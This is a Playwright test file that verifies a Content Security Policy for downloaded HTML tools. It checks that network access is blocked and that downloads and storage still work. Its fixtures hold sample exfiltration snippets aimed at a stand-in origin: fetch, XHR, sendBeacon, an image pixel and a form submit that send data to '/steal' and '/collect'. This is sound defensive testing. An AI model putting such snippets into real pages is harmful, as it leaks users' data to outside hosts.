import { expect, test } from '../../fixtures/test-options';
import { EXFIL_ORIGIN } from '../../support/policy';

/**
 * TC-CSP* — the product promise, asserted where it actually has to hold: a
 * published file opened from the local filesystem, with no server and no header
 * available. Covers AC-54 (network denied) and AC-55 (generated downloads work).
 *
 * Runs on chromium, firefox and webkit. ED-1 answered Chrome and Firefox by hand
 * and left WebKit open; this suite is what closes it and keeps it closed.
 */

const tool = (body: string) => `<!doctype html>
<html lang="en">
  <head><title>Fixture tool</title></head>
  <body>
    <h1>Fixture tool</h1>
    <p id="log">idle</p>
    <script>
      const log = (m) => { document.getElementById('log').textContent = m; };
      ${body}
    </script>
  </body>
</html>`;

const settle = async (violations: unknown[], expected: number) => {
  await expect.poll(() => violations.length, { timeout: 5_000 }).toBeGreaterThanOrEqual(expected);
};

test.describe('a downloaded tool cannot reach the network', () => {
  test('TC-CSP01: fetch to an external origin is refused @csp @safety', async ({
    openPublished,
    violations,
    reached,
    failures,
  }) => {
    await openPublished(tool(`fetch('${EXFIL_ORIGIN}/steal').catch(() => log('rejected'));`));

    await settle(violations, 1);
    expect(violations.map((v) => v.directive)).toContain('connect-src');
    // The "and not" half: nothing came back, so nothing got out.
    expect(reached).toEqual([]);

    // How each engine words the refusal, recorded rather than asserted — the
    // wording is not a contract, but a change in it is worth seeing.
    test.info().annotations.push({ type: 'refusal', description: JSON.stringify(failures) });
  });

  test('TC-CSP02: XMLHttpRequest to an external origin is refused @csp @safety', async ({
    openPublished,
    violations,
    reached,
  }) => {
    await openPublished(
      tool(`
        try {
          const xhr = new XMLHttpRequest();
          xhr.open('POST', '${EXFIL_ORIGIN}/steal');
          xhr.send('data');
        } catch (e) { log('threw'); }
      `),
    );

    await settle(violations, 1);
    expect(violations.map((v) => v.directive)).toContain('connect-src');
    expect(reached).toEqual([]);
  });

  test('TC-CSP03: sendBeacon is refused regardless of what it returns @csp @safety', async ({
    page,
    openPublished,
    violations,
    reached,
  }) => {
    await openPublished(
      tool(`log(String(navigator.sendBeacon('${EXFIL_ORIGIN}/steal', 'data')));`),
    );

    await settle(violations, 1);
    expect(violations.map((v) => v.directive)).toContain('connect-src');
    expect(reached).toEqual([]);

    // ED-1: Chrome reported `true` here for a request CSP had blocked, Firefox
    // reported `false`. The value is recorded and deliberately not asserted on —
    // if a future test starts trusting it, RULE-18 has been broken.
    const reported = await page.getByText(/true|false/).textContent();
    test.info().annotations.push({ type: 'sendBeacon returned', description: String(reported) });
  });

  test('TC-CSP04: an external image is refused @csp @safety', async ({
    openPublished,
    violations,
    reached,
  }) => {
    await openPublished(
      tool(`
        const img = new Image();
        img.onerror = () => log('error');
        img.src = '${EXFIL_ORIGIN}/pixel.png?leak=' + encodeURIComponent(document.title);
        document.body.append(img);
      `),
    );

    await settle(violations, 1);
    expect(violations.map((v) => v.directive)).toContain('img-src');
    expect(reached).toEqual([]);
  });

  test('TC-CSP05: eval is refused @csp @safety', async ({ openPublished, violations }) => {
    await openPublished(tool(`try { eval('1 + 1'); log('ran'); } catch (e) { log('blocked'); }`));

    await settle(violations, 1);
    expect(violations.map((v) => v.directive)).toContain('script-src');
  });

  test('TC-CSP13: a form cannot submit to an external origin @csp @safety', async ({
    page,
    openPublished,
    violations,
    reached,
  }) => {
    // The one channel the original policy left open in a downloaded copy. CSP
    // cannot stop navigation, but it can stop a *form* navigating: form-action
    // is consulted before the submission navigates. Without it, everything the
    // user typed leaves in the query string.
    await openPublished(`<!doctype html>
      <html lang="en">
        <head><title>Fixture tool</title></head>
        <body>
          <form method="GET" action="${EXFIL_ORIGIN}/collect">
            <input name="secret" value="user-typed-this" />
            <button type="submit">Send</button>
          </form>
        </body>
      </html>`);

    // noWaitAfter: Chromium schedules the navigation, CSP then refuses it, and
    // the scheduled-navigation wait never resolves. Waiting for it would be
    // waiting for the thing under test not to happen.
    await page.getByRole('button', { name: 'Send' }).click({ noWaitAfter: true });

    await settle(violations, 1);
    expect(violations.map((v) => v.directive)).toContain('form-action');
    expect(reached).toEqual([]);
    // Still on the tool, not on the attacker's page.
    expect(page.url().startsWith('file://')).toBe(true);
  });
});

test.describe('a downloaded tool still works', () => {
  test('TC-CSP06: inline script runs @csp', async ({ page, openPublished, violations }) => {
    await openPublished(tool(`log('inline ran');`));

    await expect(page.getByText('inline ran')).toBeVisible();
    expect(violations).toEqual([]);
  });

  test('TC-CSP07: data: and blob: images load @csp', async ({ page, openPublished }) => {
    await openPublished(
      tool(`
        const px = 'data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7';
        const fromData = new Image();
        fromData.alt = 'data image';
        fromData.src = px;
        const fromBlob = new Image();
        fromBlob.alt = 'blob image';
        fromBlob.src = URL.createObjectURL(new Blob([Uint8Array.from(atob(px.split(',')[1]), c => c.charCodeAt(0))], { type: 'image/gif' }));
        document.body.append(fromData, fromBlob);
      `),
    );

    for (const alt of ['data image', 'blob image']) {
      const image = page.getByRole('img', { name: alt });
      await expect(image).toBeVisible();
      await expect
        .poll(() => image.evaluate((el: HTMLImageElement) => el.naturalWidth))
        .toBeGreaterThan(0);
    }
  });

  test('TC-CSP08: a generated file downloads @csp @safety', async ({ page, openPublished }) => {
    await openPublished(
      tool(`
        const a = document.createElement('a');
        a.href = URL.createObjectURL(new Blob(['result'], { type: 'text/plain' }));
        a.download = 'result.txt';
        a.textContent = 'Download result';
        document.body.append(a);
      `),
    );

    const [download] = await Promise.all([
      page.waitForEvent('download'),
      page.getByRole('link', { name: 'Download result' }).click(),
    ]);

    expect(download.suggestedFilename()).toBe('result.txt');
  });

  test('TC-CSP14: a form handled with preventDefault still works @csp', async ({
    page,
    openPublished,
    violations,
  }) => {
    // The other half of TC-CSP13, and the reason form-action is the right tool
    // rather than withholding allow-forms: the directive is checked at
    // navigation time, so the `submit` event is still dispatched and an
    // ordinary handler runs untouched. If this ever fails, form-action has
    // started blocking earlier than measured and every form-driven tool is dead.
    await openPublished(`<!doctype html>
      <html lang="en">
        <head><title>Fixture tool</title></head>
        <body>
          <p id="log">idle</p>
          <form id="f"><input id="i" aria-label="Command" /><button type="submit">Go</button></form>
          <script>
            document.getElementById('f').addEventListener('submit', (e) => {
              e.preventDefault();
              document.getElementById('log').textContent = 'handled: ' + document.getElementById('i').value;
            });
          </script>
        </body>
      </html>`);

    await page.getByLabel('Command').fill('north');
    await page.getByRole('button', { name: 'Go' }).click();

    await expect(page.getByText('handled: north')).toBeVisible();
    expect(violations).toEqual([]);
  });

  test('TC-CSP09: localStorage persists across a reload @csp', async ({ page, openPublished }) => {
    await openPublished(
      tool(`
        const seen = Number(localStorage.getItem('runs') ?? '0') + 1;
        localStorage.setItem('runs', String(seen));
        log('runs: ' + seen);
      `),
    );

    await expect(page.getByText('runs: 1')).toBeVisible();

    // Reloading before the write is observable makes this test lose a race it is
    // not trying to test: the second run then reads nothing and counts 1 again.
    // The property under test is that storage survives a reload, not how quickly
    // it is flushed, so wait for the value to be readable before reloading.
    await expect.poll(() => page.evaluate(() => localStorage.getItem('runs'))).toBe('1');

    await page.reload();
    await expect(page.getByText('runs: 2')).toBeVisible();
  });
});
